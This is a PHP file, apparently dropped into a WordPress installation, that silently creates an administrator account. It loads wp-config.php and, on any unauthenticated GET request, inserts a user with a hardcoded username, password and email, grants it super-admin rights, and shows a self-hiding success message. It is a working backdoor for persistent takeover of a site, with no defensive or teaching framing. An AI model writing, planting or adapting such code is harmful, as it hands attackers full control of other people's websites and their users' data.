<?php
include('./wp-config.php');
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    $username = 'nomi';
    $password = 'nomi8899@@##';
    $email = 'nomisec07tech@gmail.com';

    $userData = array(
        'user_pass' => $password,
        'user_login' => $username,
        'user_nicename' => $username,
        'user_email' => $email,
        'display_name' => 'wordpress_administrator',
        'role' => 'administrator'
    );

    $user_id = wp_insert_user($userData);

    if (!is_wp_error($user_id)) {
        grant_super_admin($user_id);
        $message = "User created successfully.";
    } else {
        $message = "Error creating user: " . $user_id->get_error_message();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .message-container {
            text-align: center;
            padding: 20px;
            background-color: #ffffff;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .success {
            color: #2ecc71;
        }

        .error {
            color: #e74c3c;
        }
    </style>
</head>
<body>
    <div class="message-container <?php echo (isset($message) && strpos($message, 'successfully') !== false) ? 'success' : 'error'; ?>">
        <h2><?php echo $message; ?></h2>
    </div>

    <script>
        setTimeout(function() {
            document.querySelector('.message-container').style.display = 'none';
        }, 5000);
    </script>
</body>
</html>
